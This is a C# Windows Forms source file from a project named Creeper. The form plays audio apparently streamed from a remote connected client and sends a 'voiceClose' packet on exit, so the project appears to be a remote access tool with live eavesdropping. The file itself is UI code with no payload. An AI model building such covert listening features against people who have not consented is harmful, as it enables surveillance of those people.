using System;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Creeper.Connection;
using Creeper.Properties;
using MessagePack;
using WaveLib;

namespace Creeper.singleForms
{
    public partial class singleFormVoice : Form
    {
        public Clients Client { get; set; }
        public WinSoundPlayer _player;
        private int _soundBufferCount = 8;
        private int _dataBufferSize;
        public bool _isRun; 

        public singleFormVoice()
        {
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false;
            SetTheme(); 
            Initialize();
        }
        #region Theme
        private void SetTheme()
        {
            bool darkTheme = Settings.Default.darkTheme;

            Color colorSide = darkTheme ? Settings.Default.colorsidedark : Settings.Default.colorside;
            Color colorText = darkTheme ? Settings.Default.colortextdark : Settings.Default.colortext;

            BackColor = colorSide;
            ForeColor = colorText;

            paneltop.BackColor = colorSide;
            labelCreeper.BackColor = colorSide;
            labelCreeper.ForeColor = colorText;
            buttonclose.BackColor = colorSide;

            buttonclose.Image = darkTheme ? Resources.close : Resources.close_dark;

        }
        #endregion

        #region Move
        [DllImport("user32.dll")]
        public static extern bool ReleaseCapture();
        [DllImport("user32.dll")]
        public static extern bool SendMessage(IntPtr hwnd, int wMsg, int wParam, int lParam);
        public const int WM_SYSCOMMAND = 0x0112;
        public const int SC_MOVE = 0xF010;
        public const int HTCAPTION = 0x0002;
        private void paneltop_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(Handle, WM_SYSCOMMAND, SC_MOVE + HTCAPTION, 0);
        }
        private void labelCreeper_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(Handle, WM_SYSCOMMAND, SC_MOVE + HTCAPTION, 0);
        }
        #endregion

        private void buttonclose_Click(object sender, EventArgs e)
        {
            if (Client != null)
            {
                MsgPack pack = new MsgPack();
                pack.ForcePathObject("Packet").AsString = "voiceClose";
                ThreadPool.QueueUserWorkItem(Client.BeginSend, pack.Encode2Bytes());
            }
            if (_player != null)
                _player.Close();
            _isRun = false;
            Close();
        }

        private void Initialize()
        {
            _dataBufferSize = 1280;

            string waveOutDeviceName = WinSound.GetWaveOutDeviceNames().Count > 0 ? WinSound.GetWaveOutDeviceNames()[0] : null;

            if (waveOutDeviceName != null)
            {
                _player = new WinSoundPlayer();
                _player.Open(waveOutDeviceName, 44100, 16, 1, _dataBufferSize, _soundBufferCount);
            }
            else
            {
                MessageBox.Show("Can't find Wave Out Device!");
                Close();
            }

            _isRun = true;
        }
    }
}
